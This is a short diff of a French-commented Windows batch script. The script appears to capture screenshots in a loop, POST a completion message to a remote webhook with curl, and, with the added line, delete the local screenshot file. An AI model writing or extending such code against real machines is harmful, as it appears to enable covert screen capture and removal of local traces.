@@ -85,6 +85,7 @@ if %photo%==true (
     :: 🎯 Vérification du temps d'envoi (toutes les 10 secondes pendant 30 secondes)
     set /A COUNT+=1
     if !COUNT! geq %NbPhoto% (
+        del "%SCREENSHOT_PATH%"
         curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Fin_des_capture\"}" %WEBHOOK_URL% 
         goto END
     )
